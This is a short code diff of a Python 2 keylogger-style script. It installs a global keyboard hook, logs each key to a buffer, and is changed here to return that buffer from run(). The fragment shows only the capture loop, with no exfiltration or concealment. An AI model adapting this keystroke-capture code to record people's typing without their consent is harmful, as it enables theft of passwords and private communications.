@@ -68,6 +68,8 @@ def KeyStroke(event):
         else:
             print "[%s]" %event.Key
             key_buffer.append(event.Key)
+            
+        
     #pass execution to next hook registered
     return True
 
@@ -78,4 +80,5 @@ def run():
     #register the hook and execute forever
     k1.HookKeyboard()
     pythoncom.PumpMessages()
-    return 
+    
+    return key_buffer
